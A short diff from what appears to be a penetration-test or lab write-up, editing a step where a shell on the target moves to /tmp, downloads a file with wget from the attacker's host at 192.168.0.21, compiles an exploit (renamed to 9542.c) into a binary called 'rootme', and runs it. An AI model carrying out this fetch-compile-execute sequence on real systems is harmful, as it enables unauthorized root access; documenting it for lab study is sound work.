@@ -98,7 +98,7 @@ The exploit module was staged inside the Kali environment, served over an unencr
 # On Target Environment Shell
 cd /tmp
 wget http://192.168.0.21
-gcc -o rootme exploit.c
+gcc -o rootme 9542.c
 ./rootme
 ```
 
